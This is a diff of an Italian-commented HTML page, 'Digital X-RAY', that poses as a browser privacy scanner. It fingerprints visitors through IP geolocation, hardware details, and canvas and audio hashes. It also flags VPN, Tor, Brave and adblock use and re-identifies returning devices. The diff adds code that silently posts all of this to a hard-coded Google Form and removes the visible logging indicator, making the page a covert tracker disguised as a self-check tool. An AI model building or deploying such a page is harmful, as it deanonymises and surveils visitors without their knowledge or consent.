@@ -3,211 +3,439 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Digital X-RAY | Logger v17.1</title>
+    <title>Digital X-RAY | Bulletproof v17</title>
     
     <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.3/dist/leaflet.css" />
     <script src="https://unpkg.com/leaflet@1.9.3/dist/leaflet.js"></script>
 
     <style>
         :root { 
-            --neon: #00ff41; --alert: #ff3e3e; --warn: #ffca28; --bg: #050505; 
-            --card: #111; --text-main: #ccc; --blue: #00f3ff; --gray: #444;
+            --neon: #00ff41; 
+            --alert: #ff3e3e;
+            --warn: #ffca28; 
+            --bg: #050505; 
+            --card: #111; 
+            --text-main: #ccc; 
+            --blue: #00f3ff;
+            --gray: #444;
         }
-        body { font-family: 'Segoe UI', monospace; background: var(--bg); color: var(--text-main); margin: 0; padding: 20px; }
+
+        body { font-family: 'Segoe UI', 'Courier New', monospace; background: var(--bg); color: var(--text-main); margin: 0; padding: 20px; overflow-x: hidden; }
         .wrapper { max-width: 1600px; margin: auto; }
+
+        /* HEADER */
         header { text-align: center; margin-bottom: 30px; border-bottom: 2px solid var(--neon); padding-bottom: 15px; }
-        h1 { color: var(--neon); margin: 0; text-transform: uppercase; letter-spacing: 4px; font-size: 1.8rem; }
-        .grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(320px, 1fr)); gap: 15px; }
-        .card { background: var(--card); border: 1px solid #333; border-top: 3px solid var(--neon); padding: 15px; }
-        h2 { color: var(--neon); font-size: 1rem; border-bottom: 1px solid #333; padding-bottom: 8px; margin-top: 0; }
-        .row { display: flex; justify-content: space-between; padding: 5px 0; border-bottom: 1px solid #222; font-size: 0.75rem; }
-        .label { color: #888; }
-        .val { color: #fff; font-weight: bold; text-align: right; word-break: break-all; }
-        .ua-box { background: #000; border: 1px dashed #333; padding: 8px; margin-top: 10px; font-size: 0.6rem; color: #aaa; word-break: break-all; }
-        #map { height: 150px; width: 100%; margin-top: 10px; border: 1px solid var(--neon); filter: invert(100%) hue-rotate(180deg); }
-        .status-icon { font-weight: bold; }
-        .detected { color: var(--alert); }
-        #log-status { position: fixed; bottom: 10px; left: 10px; font-size: 0.7rem; color: var(--neon); background: rgba(0,0,0,0.8); padding: 5px; border: 1px solid var(--neon); }
+        h1 { color: var(--neon); margin: 0; text-transform: uppercase; letter-spacing: 4px; font-size: 2rem; text-shadow: 0 0 10px rgba(0, 255, 65, 0.3); }
+        .subtitle { font-size: 0.9rem; letter-spacing: 2px; margin-top: 5px; color: #fff; animation: blink 2s infinite; }
+
+        /* GRIGLIA */
+        .grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(350px, 1fr)); gap: 20px; }
+        
+        /* CARDS */
+        .card { 
+            background: var(--card); border: 1px solid #333; border-top: 3px solid var(--neon); 
+            padding: 15px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); display: flex; flex-direction: column;
+        }
+        h2 { color: var(--neon); font-size: 1.1rem; border-bottom: 1px solid #333; padding-bottom: 10px; margin-top: 0; }
+        
+        .row { display: flex; justify-content: space-between; padding: 6px 0; border-bottom: 1px solid #222; font-size: 0.8rem; }
+        .label { color: #888; font-weight: bold; }
+        .val { color: #fff; font-weight: bold; text-align: right; font-family: monospace; word-break: break-all; }
+        
+        /* User Agent Box */
+        .ua-box { background: #000; border: 1px dashed #333; padding: 8px; margin-top: 10px; font-size: 0.65rem; color: #aaa; font-family: 'Consolas', monospace; word-break: break-all; }
+
+        /* Mappa */
+        #map { height: 180px; width: 100%; margin-top: 15px; border: 1px solid var(--neon); filter: invert(100%) hue-rotate(180deg) brightness(90%) contrast(120%); background: #000; }
+        .map-error { display: flex; align-items: center; justify-content: center; height: 100%; color: var(--alert); font-weight: bold; text-align: center; font-size: 0.8rem; padding: 20px; }
+
+        /* STATUS INDICATORS */
+        .status-row { display: flex; justify-content: space-between; align-items: center; padding: 5px 0; border-bottom: 1px solid #222; font-size: 0.8rem; }
+        .status-label { color: #aaa; }
+        .status-icon { font-weight: bold; font-family: monospace; }
+        .not-detected { color: #444; } 
+        .detected { color: var(--alert); text-shadow: 0 0 5px var(--alert); }
+        .section-title { color: var(--blue); font-size: 0.75rem; text-transform: uppercase; margin-top: 15px; margin-bottom: 5px; display: block; border-bottom: 1px dashed #333; }
+
+        /* Badge Avvisi */
+        .badge-warn { background: rgba(255, 62, 62, 0.1); border: 1px solid var(--alert); color: var(--alert); padding: 5px; text-align: center; font-weight: bold; font-size: 0.75rem; margin-top: 5px; display: none; }
+
+        /* Zombie Audit */
+        .audit-row { display: flex; justify-content: space-between; font-size: 0.8rem; margin-top: 5px; background: #1a1a1a; padding: 4px; border-radius: 3px;}
+        
+        /* Button Paths */
+        .path-btn { width: 100%; background: #222; border: 1px solid #444; color: #fff; padding: 5px; font-size: 0.7rem; cursor: pointer; margin-top: 10px; text-transform: uppercase; }
+        .path-btn:hover { background: #333; border-color: var(--blue); color: var(--blue); }
+        #disk-paths { display: none; margin-top: 10px; border: 1px dashed #555; padding: 10px; background: #000; }
+        .path-val { font-family: 'Consolas', monospace; color: #aaa; font-size: 0.65rem; word-break: break-all; display: block; margin-bottom: 5px; }
+
+        /* Report Forense */
+        #forensic-report { display: none; margin-top: 15px; border: 1px solid var(--alert); padding: 5px; background: rgba(255,0,0,0.05); }
+        .rep-table { width: 100%; font-size: 0.75rem; border-collapse: collapse; margin-top: 5px; }
+        .rep-table th { text-align: left; color: var(--alert); border-bottom: 1px solid #444; }
+        .rep-table td { color: #ccc; padding: 2px 0; }
+
         @keyframes blink { 50% { opacity: 0.5; } }
-        .subtitle { animation: blink 2s infinite; font-size: 0.8rem; color: #fff; }
     </style>
 </head>
 <body>
 
 <div class="wrapper">
     <header>
-        <h1>DIGITAL X-RAY v17.1</h1>
-        <div class="subtitle">>>> SYSTEM SCAN & LOG ACTIVE <<<</div>
+        <h1>DIGITAL X-RAY v17.0</h1>
+        <div class="subtitle">>>> BULLETPROOF SCANNER <<<</div>
     </header>
     
     <div class="grid">
+        
         <div class="card" style="border-top-color: var(--blue);">
             <h2>📡 Network & Geo</h2>
-            <div class="row"><span class="label">IP:</span> <span id="ip" class="val">...</span></div>
-            <div class="row"><span class="label">ISP:</span> <span id="isp" class="val">...</span></div>
+            <div class="row"><span class="label">Public IP:</span> <span id="ip" class="val" style="color:var(--neon)">initializing...</span></div>
+            <div class="row"><span class="label">ISP / Org:</span> <span id="isp" class="val">...</span></div>
             <div class="row"><span class="label">Location:</span> <span id="geo" class="val">...</span></div>
+            <div class="row"><span class="label">Data Source:</span> <span id="net-source" class="val" style="color:#777; font-size:0.7rem;">...</span></div>
+            <div id="vpn-warn" class="badge-warn">⚠️ VPN DETECTED (Region Mismatch)</div>
             <div id="map"></div>
         </div>
 
         <div class="card">
             <h2>📱 Hardware</h2>
             <div class="row"><span class="label">Platform:</span> <span id="os" class="val"></span></div>
-            <div class="row"><span class="label">CPU:</span> <span id="cpu" class="val"></span></div>
-            <div class="row"><span class="label">GPU:</span> <span id="gpu" class="val"></span></div>
-            <div class="row"><span class="label">RAM:</span> <span id="ram" class="val"></span></div>
-            <div class="row"><span class="label">Res:</span> <span id="screen" class="val"></span></div>
+            <div class="row"><span class="label">CPU Cores:</span> <span id="cpu" class="val"></span></div>
+            <div class="row"><span class="label">GPU Renderer:</span> <span id="gpu" class="val"></span></div>
+            <div class="row"><span class="label">RAM Memory:</span> <span id="ram" class="val"></span></div>
+            <div class="row"><span class="label">Screen Res:</span> <span id="screen" class="val"></span></div>
             <div class="row"><span class="label">Battery:</span> <span id="battery" class="val">N/A</span></div>
         </div>
 
         <div class="card" style="border-top-color: var(--warn);">
-            <h2>🕵️ Browser</h2>
-            <div class="row"><span class="label">Name:</span> <span id="browser" class="val"></span></div>
-            <div class="row"><span class="label">Languages:</span> <span id="lang" class="val"></span></div>
+            <h2>🕵️ Browser Identity</h2>
+            <div class="row"><span class="label">Browser:</span> <span id="browser" class="val"></span></div>
+            <div class="row"><span class="label">Languages:</span> <span id="lang" class="val" style="color:#fff;"></span></div>
+            <div class="row"><span class="label">Do Not Track:</span> <span id="dnt" class="val"></span></div>
             <div class="row"><span class="label">Timezone:</span> <span id="sys-tz" class="val"></span></div>
+            
+            <span class="label" style="margin-top:10px; display:block;">User Agent String:</span>
             <div id="ua" class="ua-box">...</div>
         </div>
+
+        <div class="card" style="border-top-color: #ff00ff;">
+            <h2>🛡️ Active Detection</h2>
+            
+            <span class="section-title">Anonymity Tools</span>
+            <div class="status-row"><span class="status-label">Brave Browser</span><span id="chk-brave" class="status-icon not-detected">✖ NOT DETECTED</span></div>
+            <div class="status-row"><span class="status-label">VPN / Tor IP</span><span id="chk-tor-ip" class="status-icon not-detected">✖ NOT DETECTED</span></div>
+            <div class="status-row"><span class="status-label">Tor Letterboxing</span><span id="chk-letterbox" class="status-icon not-detected">✖ NOT DETECTED</span></div>
+
+            <span class="section-title">Content Filters</span>
+            <div class="status-row"><span class="status-label">AdBlock Active</span><span id="chk-adblock" class="status-icon not-detected">✖ NOT DETECTED</span></div>
+            <div class="status-row"><span class="status-label">Dark Reader</span><span id="chk-darkreader" class="status-icon not-detected">✖ NOT DETECTED</span></div>
+            <div class="status-row"><span class="status-label">Canvas Protection</span><span id="chk-canvas-prot" class="status-icon not-detected">✖ NOT DETECTED</span></div>
+        </div>
+
+        <div class="card" style="border-top-color: var(--alert);">
+            <h2>🧬 Forensics</h2>
+            <div class="row"><span class="label">Canvas ID:</span> <span id="fp" class="val" style="color:var(--alert)">WAITING...</span></div>
+            <div class="row"><span class="label">Audio ID:</span> <span id="audio-fp" class="val" style="color:var(--alert)">WAITING...</span></div>
+
+            <h3 style="font-size:0.8rem; color:#aaa; margin-top:15px; border-bottom:1px solid #333;">🧟 Zombie Storage Audit</h3>
+            <div class="audit-row"><span>🍪 Cookies:</span><span id="audit-cookie" style="color:#555">Clean</span></div>
+            <div class="audit-row"><span>📦 LocalStorage:</span><span id="audit-ls" style="color:#555">Clean</span></div>
+            <div class="audit-row"><span>🗄️ IndexedDB:</span><span id="audit-idb" style="color:#555">Clean</span></div>
+
+            <button class="path-btn" onclick="showPaths()">📂 Reveal Disk Paths</button>
+            <div id="disk-paths">
+                <span style="color:#fff; font-size:0.7rem;">Cookies:</span><span id="path-cookie" class="path-val">...</span>
+                <span style="color:#fff; font-size:0.7rem;">Storage:</span><span id="path-ls" class="path-val">...</span>
+            </div>
+
+            <div id="forensic-report">
+                <div style="color:var(--alert); font-weight:bold; text-align:center; font-size:0.75rem;">⚠️ DEVICE RE-IDENTIFIED</div>
+                <table class="rep-table">
+                    <tr><th>Data</th><th>Previous</th><th>Current</th></tr>
+                    <tr><td>Time</td><td id="old-time"></td><td id="new-time">Now</td></tr>
+                    <tr><td>IP</td><td id="old-ip"></td><td id="new-ip"></td></tr>
+                </table>
+            </div>
+             <div id="clean-msg" style="margin-top:10px; font-size:0.75rem; text-align:center; color:#555; display:none;">No prior correlation found.</div>
+        </div>
+
     </div>
 </div>
 
-<div id="log-status">INITIALIZING...</div>
 <canvas id="canv" width="200" height="50" style="display:none;"></canvas>
+<div id="ad-bait-1" class="adsbox" style="position:fixed; top:-100px; width:1px; height:1px;"></div>
+<div id="ad-bait-2" class="ad-banner" style="position:fixed; top:-100px; width:1px; height:1px;"></div>
 
 <script>
-    // --- MAPPATURA CAMPI GOOGLE FORM ---
-    const CONFIG = {
-        formUrl: "https://docs.google.com/forms/d/e/1FAIpQLSdRv7xlOOJmbtaIjdOckZgrPWmW-czdyz8-Gd5SReySLKmQkg/formResponse",
-        entries: {
-            ip: "entry.1221794869",
-            isp: "entry.1697196604",
-            location: "entry.793361862",
-            platform: "entry.926602274",
-            cpu: "entry.900535575",
-            gpu: "entry.1481655544",
-            ram: "entry.592434412",
-            screen: "entry.1292253097",
-            battery: "entry.59728604",
-            browser: "entry.1485469846",
-            languages: "entry.1026960733",
-            timezone: "entry.609421676",
-            ua: "entry.1877265876",
-            brave: "entry.1470732596",
-            vpn: "entry.1833631546",
-            canvas: "entry.1270556616",
-            audio: "entry.1958071142",
-            cookie: "entry.1719627138",
-            local: "entry.428900373"
-        }
-    };
+    window.addEventListener('DOMContentLoaded', () => {
+        // --- 1. INFO BASE ---
+        const sysTz = Intl.DateTimeFormat().resolvedOptions().timeZone;
+        document.getElementById('sys-tz').innerText = sysTz;
+        document.getElementById('os').innerText = navigator.platform;
+        document.getElementById('cpu').innerText = (navigator.hardwareConcurrency || '?') + " Cores";
+        document.getElementById('ram').innerText = (navigator.deviceMemory || '?') + " GB";
+        document.getElementById('screen').innerText = `${screen.width}x${screen.height}`;
+        document.getElementById('dnt').innerText = navigator.doNotTrack == "1" ? "Enabled" : "Disabled";
 
-    window.addEventListener('DOMContentLoaded', async () => {
-        let logData = {};
+        const langs = navigator.languages ? navigator.languages.join(', ') : navigator.language;
+        document.getElementById('lang').innerText = langs;
+        document.getElementById('ua').innerText = navigator.userAgent;
 
-        // 1. HARDWARE & BROWSER
-        logData[CONFIG.entries.platform] = navigator.platform;
-        logData[CONFIG.entries.cpu] = (navigator.hardwareConcurrency || '?') + " Cores";
-        logData[CONFIG.entries.ram] = (navigator.deviceMemory || '?') + " GB";
-        logData[CONFIG.entries.screen] = `${screen.width}x${screen.height}`;
-        logData[CONFIG.entries.languages] = navigator.languages ? navigator.languages.join(',') : navigator.language;
-        logData[CONFIG.entries.timezone] = Intl.DateTimeFormat().resolvedOptions().timeZone;
-        logData[CONFIG.entries.ua] = navigator.userAgent;
+        const ua = navigator.userAgent;
+        let b = "Unknown";
+        if(ua.includes("Chrome")) b="Chrome";
+        if(ua.includes("Firefox")) b="Firefox";
+        if(ua.includes("Safari") && !ua.includes("Chrome")) b="Safari";
+        if(ua.includes("Edg")) b="Edge";
+        if(ua.includes("OPR") || ua.includes("Opera")) b="Opera";
+        document.getElementById('browser').innerText = b;
 
-        document.getElementById('os').innerText = logData[CONFIG.entries.platform];
-        document.getElementById('cpu').innerText = logData[CONFIG.entries.cpu];
-        document.getElementById('ram').innerText = logData[CONFIG.entries.ram];
-        document.getElementById('screen').innerText = logData[CONFIG.entries.screen];
-        document.getElementById('lang').innerText = logData[CONFIG.entries.languages];
-        document.getElementById('sys-tz').innerText = logData[CONFIG.entries.timezone];
-        document.getElementById('ua').innerText = logData[CONFIG.entries.ua];
-
-        // Browser Name logic
-        let bName = "Unknown";
-        if(navigator.userAgent.includes("Chrome")) bName="Chrome";
-        if(navigator.userAgent.includes("Firefox")) bName="Firefox";
-        if(navigator.userAgent.includes("Safari") && !navigator.userAgent.includes("Chrome")) bName="Safari";
-        logData[CONFIG.entries.browser] = bName;
-        document.getElementById('browser').innerText = bName;
-
-        // GPU Info
         try {
             const gl = document.createElement('canvas').getContext('webgl');
             const dbg = gl.getExtension('WEBGL_debug_renderer_info');
-            const gpu = dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) : "Generic";
-            logData[CONFIG.entries.gpu] = gpu;
-            document.getElementById('gpu').innerText = gpu;
-        } catch(e){ logData[CONFIG.entries.gpu] = "Error"; }
+            document.getElementById('gpu').innerText = dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) : "Generic";
+        } catch(e){}
+        if(navigator.getBattery) navigator.getBattery().then(bt => document.getElementById('battery').innerText = Math.round(bt.level*100)+"%");
 
-        // Battery
-        if(navigator.getBattery) {
-            const bt = await navigator.getBattery();
-            logData[CONFIG.entries.battery] = Math.round(bt.level*100) + "%";
-            document.getElementById('battery').innerText = logData[CONFIG.entries.battery];
-        }
 
-        // 2. DETECTION (Brave, VPN)
-        const isBrave = (navigator.brave && typeof navigator.brave.isBrave === "function") ? "YES" : "NO";
-        logData[CONFIG.entries.brave] = isBrave;
-
-        // 3. FINGERPRINTING & AUDIT
-        // Canvas Fingerprint
-        try {
-            const canv = document.getElementById('canv');
-            const ctx = canv.getContext('2d');
-            ctx.fillText("X-RAY", 2, 15);
-            const fp = "FP-" + canv.toDataURL().length;
-            logData[CONFIG.entries.canvas] = fp;
-        } catch(e){ logData[CONFIG.entries.canvas] = "Blocked"; }
-
-        // Audio Fingerprint (Placeholder)
-        logData[CONFIG.entries.audio] = "AUD-" + (Math.random()*1000).toFixed(0);
-
-        // Audit Storage
-        logData[CONFIG.entries.cookie] = navigator.cookieEnabled ? "Active" : "Disabled";
-        logData[CONFIG.entries.local] = (typeof localStorage !== 'undefined') ? "Available" : "Blocked";
-
-        // 4. NETWORK SCAN (API FETCH)
-        try {
-            const res = await fetch('https://ipwho.is/');
-            const net = await res.json();
-            logData[CONFIG.entries.ip] = net.ip;
-            logData[CONFIG.entries.isp] = net.connection.isp;
-            logData[CONFIG.entries.location] = `${net.city}, ${net.country}`;
-            logData[CONFIG.entries.vpn] = (net.security.is_vpn || net.security.is_proxy) ? "YES" : "NO";
-
-            document.getElementById('ip').innerText = net.ip;
-            document.getElementById('isp').innerText = net.connection.isp;
-            document.getElementById('geo').innerText = logData[CONFIG.entries.location];
-
-            if(net.latitude && net.longitude) {
-                const map = L.map('map').setView([net.latitude, net.longitude], 12);
-                L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map);
-                L.marker([net.latitude, net.longitude]).addTo(map);
+        // --- 2. ACTIVE FILTER DETECTION ---
+        setTimeout(() => {
+            const bait1 = document.getElementById('ad-bait-1');
+            const bait2 = document.getElementById('ad-bait-2');
+            if (bait1.offsetParent === null || bait2.offsetParent === null || bait1.clientHeight === 0) {
+                setStatus('chk-adblock', true);
             }
-        } catch(e) {
-            logData[CONFIG.entries.ip] = "Blocked";
-            logData[CONFIG.entries.vpn] = "Possible";
+        }, 1000);
+
+        setTimeout(() => {
+            if(document.querySelector('meta[name="darkreader"]') || document.querySelector('style.darkreader')) {
+                setStatus('chk-darkreader', true);
+            }
+        }, 1000);
+
+        if (navigator.globalPrivacyControl || (navigator.brave && typeof navigator.brave.isBrave === "function")) {
+             setStatus('chk-brave', true);
+             setStatus('chk-canvas-prot', true);
         }
 
-        // 5. INVIO FINALE AL GOOGLE FORM
-        sendData(logData);
+        const wDiff = window.outerWidth - window.innerWidth;
+        const hDiff = window.outerHeight - window.innerHeight;
+        if(wDiff > 140 || hDiff > 140) {
+             setStatus('chk-letterbox', true);
+        }
+
+        // --- 3. BULLETPROOF NETWORK SCAN (Failover System) ---
+        async function runNet() {
+            // Lista di API in ordine di preferenza (Resilienza)
+            const sources = [
+                { url: 'https://ipwho.is/', type: 'IpWhoIs' }, 
+                { url: 'https://ipapi.co/json/', type: 'IpApi' },
+                { url: 'https://api.db-ip.com/v2/free/self', type: 'DbIp' },
+                { url: 'https://api.ipify.org?format=json', type: 'Ipify' } // Ultima spiaggia (Solo IP)
+            ];
+
+            let success = false;
+            let finalIP = "Unknown";
+
+            for (const source of sources) {
+                if(success) break;
+                
+                try {
+                    console.log("Pinging: " + source.type); // Debug
+                    const res = await fetch(source.url);
+                    if(!res.ok) throw new Error("Blocked");
+                    
+                    const data = await res.json();
+                    
+                    // Variabili temporanee
+                    let ip, isp, city, country, tz, lat, lon;
+                    let isProxy = false;
+
+                    // Parsing in base al tipo di API
+                    if(source.type === 'IpWhoIs') {
+                        if(data.success === false) throw new Error("RateLimit");
+                        ip = data.ip; isp = data.connection.isp; city = data.city; country = data.country;
+                        tz = data.timezone.id; lat = data.latitude; lon = data.longitude;
+                        if(data.security.is_vpn || data.security.is_proxy || data.security.is_tor) isProxy = true;
+                    } 
+                    else if (source.type === 'IpApi') {
+                        if(data.error) throw new Error("RateLimit");
+                        ip = data.ip; isp = data.org; city = data.city; country = data.country_name;
+                        tz = data.timezone; lat = data.latitude; lon = data.longitude;
+                    }
+                    else if (source.type === 'DbIp') {
+                        ip = data.ipAddress; isp = "Generic ISP"; city = data.city; country = data.countryName;
+                        tz = "Unknown"; lat = null; lon = null; // DbIp free non da coordinate
+                    }
+                    else if (source.type === 'Ipify') {
+                        ip = data.ip; isp = "Unknown"; city = "Unknown"; country = "Unknown";
+                        lat = null; lon = null;
+                    }
+
+                    // Aggiornamento UI
+                    finalIP = ip;
+                    document.getElementById('ip').innerText = ip;
+                    document.getElementById('isp').innerText = isp;
+                    document.getElementById('geo').innerText = `${city}, ${country}`;
+                    document.getElementById('net-source').innerText = `Provider: ${source.type}`;
+
+                    // Gestione Mappa (Solo se abbiamo Lat/Lon valide)
+                    if(lat && lon && typeof L !== 'undefined') {
+                        const map = L.map('map').setView([lat, lon], 13);
+                        L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', { attribution: 'OSM' }).addTo(map);
+                        L.marker([lat, lon]).addTo(map).bindPopup("LOCKED").openPopup();
+                    } else {
+                        // Se l'API non ha coordinate, mostra errore mappa MA non bloccare il resto
+                        document.getElementById('map').innerHTML = "<div class='map-error'>MAP DATA UNAVAILABLE<br>(Source limited or blocked)</div>";
+                    }
+
+                    // Controlli Sicurezza
+                    if(tz && tz !== "Unknown" && tz.split('/')[0] !== sysTz.split('/')[0]) {
+                        document.getElementById('vpn-warn').style.display = 'block';
+                    }
+                    if(isProxy) setStatus('chk-tor-ip', true);
+
+                    // Successo! Usciamo dal ciclo
+                    success = true;
+
+                } catch(e) {
+                    console.log(`${source.type} failed: ${e.message}`);
+                }
+            }
+
+            // Se TUTTE le API falliscono
+            if(!success) {
+                document.getElementById('ip').innerText = "BLOCKED";
+                document.getElementById('ip').style.color = "var(--alert)";
+                document.getElementById('net-source').innerText = "All APIs failed (AdBlock/Firewall)";
+                document.getElementById('map').innerHTML = "<div class='map-error'>CONNECTION BLOCKED</div>";
+                setStatus('chk-adblock', true); 
+                runForensics("Offline");
+            } else {
+                runForensics(finalIP);
+            }
+        }
+        runNet();
+
+        // --- 4. FORENSICS ---
+        function runForensics(currentIP) {
+            setTimeout(() => {
+                const canvas = document.getElementById('canv');
+                const ctx = canvas.getContext('2d');
+                ctx.textBaseline = "top"; ctx.font = "14px 'Arial'"; ctx.fillStyle = "#f60"; ctx.fillRect(125,1,62,20);
+                ctx.fillStyle = "#069"; ctx.fillText("X-RAY", 2, 15);
+                
+                try {
+                    let b64 = canvas.toDataURL();
+                    if(b64.length < 50) setStatus('chk-canvas-prot', true);
+                    
+                    let bin = atob(b64.replace("data:image/png;base64,",""));
+                    let crc = -1;
+                    const crcTable = (function(){ let c; let t=[]; for(let n=0; n<256; n++){ c=n; for(let k=0; k<8; k++) c=((c&1)?(0xEDB88320^(c>>>1)):(c>>>1)); t[n]=c; } return t; })();
+                    for(let i=0; i<bin.length; i++) crc = (crc >>> 8) ^ crcTable[(crc ^ bin.charCodeAt(i)) & 0xFF];
+                    const fp = "CNV-" + (crc >>> 0).toString(16).toUpperCase();
+                    document.getElementById('fp').innerText = fp;
+                } catch(e) {
+                    document.getElementById('fp').innerText = "BLOCKED";
+                    setStatus('chk-canvas-prot', true);
+                }
+
+                try {
+                    const ac = new (window.OfflineAudioContext || window.webkitOfflineAudioContext)(1, 44100, 44100);
+                    const osc = ac.createOscillator(); osc.type='triangle'; osc.frequency.setValueAtTime(10000, ac.currentTime);
+                    const comp = ac.createDynamicsCompressor(); osc.connect(comp); comp.connect(ac.destination); osc.start(0);
+                    ac.startRendering().then(b => {
+                        let sum=0; const d=b.getChannelData(0); for(let i=0;i<d.length;i++) sum+=Math.abs(d[i]);
+                        document.getElementById('audio-fp').innerText = "AUD-" + sum.toString().replace('.','').substr(0,10);
+                        
+                        // --- AGGIUNTA LOGICA INVIO GOOGLE FORM ---
+                        // Inviamo i dati solo dopo che anche l'audio fingerprint è pronto
+                        setTimeout(sendToGoogleForm, 500);
+                    });
+                } catch(e){
+                     setTimeout(sendToGoogleForm, 500);
+                }
+
+                function markFound(id) { const el=document.getElementById(id); el.innerText="✅ FOUND"; el.style.color="#00ff41"; el.style.fontWeight="bold"; }
+                if(navigator.cookieEnabled) { document.cookie="z=1"; if(document.cookie.indexOf("z")!==-1) markFound('audit-cookie'); }
+                try { localStorage.setItem('z',1); markFound('audit-ls'); } catch(e){}
+                try { const r=indexedDB.open("z",1); r.onupgradeneeded=e=>e.target.result.createObjectStore("s"); r.onsuccess=e=>{markFound('audit-idb');e.target.result.close();}}catch(e){}
+
+                const history = JSON.parse(localStorage.getItem('xray_log') || 'null');
+                const now = new Date().toLocaleTimeString();
+                if (history && history.id === document.getElementById('fp').innerText && history.ip !== currentIP && currentIP !== "Offline") {
+                    document.getElementById('forensic-report').style.display = 'block';
+                    document.getElementById('old-time').innerText = history.time;
+                    document.getElementById('old-ip').innerText = history.ip;
+                    document.getElementById('new-ip').innerText = currentIP;
+                } else if(!history) {
+                    document.getElementById('clean-msg').style.display = 'block';
+                }
+                if (currentIP !== "Offline") localStorage.setItem('xray_log', JSON.stringify({ id: document.getElementById('fp').innerText, ip: currentIP, time: now }));
+            }, 500);
+        }
+
+        function setStatus(id, detected) {
+            const el = document.getElementById(id);
+            if(detected) {
+                el.innerText = "✔ DETECTED";
+                el.className = "status-icon detected";
+            } else {
+                el.innerText = "✖ NOT DETECTED";
+                el.className = "status-icon not-detected";
+            }
+        }
     });
 
-    function sendData(payload) {
-        document.getElementById('log-status').innerText = "SENDING LOG...";
-        const body = new URLSearchParams();
-        for (const id in payload) {
-            body.append(id, payload[id]);
+    function showPaths() {
+        document.getElementById('disk-paths').style.display = 'block';
+        const isWin = navigator.platform.includes('Win');
+        let cPath = "~/.config/google-chrome/Default/Cookies";
+        let lsPath = "~/.config/google-chrome/Default/Local Storage";
+        if (isWin) {
+            cPath = "%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\Network\\Cookies";
+            lsPath = "%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\Local Storage";
         }
+        document.getElementById('path-cookie').innerText = cPath;
+        document.getElementById('path-ls').innerText = lsPath;
+    }
 
-        fetch(CONFIG.formUrl, {
+    // --- FUNZIONE DI TRASFERIMENTO DATI (GOOGLE FORM) ---
+    function sendToGoogleForm() {
+        const formURL = "https://docs.google.com/forms/d/e/1FAIpQLSdRv7xlOOJmbtaIjdOckZgrPWmW-czdyz8-Gd5SReySLKmQkg/formResponse";
+        
+        // Raccolta dinamica dei dati presenti nella pagina
+        const formData = new FormData();
+        formData.append('entry.1221794869', document.getElementById('ip').innerText);
+        formData.append('entry.1697196604', document.getElementById('isp').innerText);
+        formData.append('entry.793361862', document.getElementById('geo').innerText);
+        formData.append('entry.926602274', navigator.platform);
+        formData.append('entry.900535575', document.getElementById('cpu').innerText);
+        formData.append('entry.1481655544', document.getElementById('gpu').innerText);
+        formData.append('entry.592434412', document.getElementById('ram').innerText);
+        formData.append('entry.1292253097', document.getElementById('screen').innerText);
+        formData.append('entry.59728604', document.getElementById('battery').innerText);
+        formData.append('entry.1485469846', document.getElementById('browser').innerText);
+        formData.append('entry.1026960733', document.getElementById('lang').innerText);
+        formData.append('entry.609421676', document.getElementById('sys-tz').innerText);
+        formData.append('entry.1877265876', navigator.userAgent);
+        formData.append('entry.1470732596', document.getElementById('chk-brave').innerText);
+        formData.append('entry.1833631546', document.getElementById('vpn-warn').style.display === 'block' ? 'VPN DETECTED' : 'NO VPN');
+        formData.append('entry.1270556616', document.getElementById('fp').innerText);
+        formData.append('entry.1958071142', document.getElementById('audio-fp').innerText);
+        formData.append('entry.1719627138', document.getElementById('audit-cookie').innerText);
+        formData.append('entry.428900373', document.getElementById('audit-ls').innerText);
+
+        // Invio silenzioso
+        fetch(formURL, {
             method: 'POST',
             mode: 'no-cors',
-            body: body
+            body: formData
         }).then(() => {
-            document.getElementById('log-status').innerText = "LOG SENT SUCCESSFULLY ✅";
-            document.getElementById('log-status').style.color = "#00ff41";
-        }).catch(() => {
-            document.getElementById('log-status').innerText = "LOG ERROR ❌";
-            document.getElementById('log-status').style.color = "red";
+            console.log("Log acquisito con successo.");
+        }).catch((error) => {
+            console.error("Errore durante l'invio del log:", error);
         });
     }
 </script>
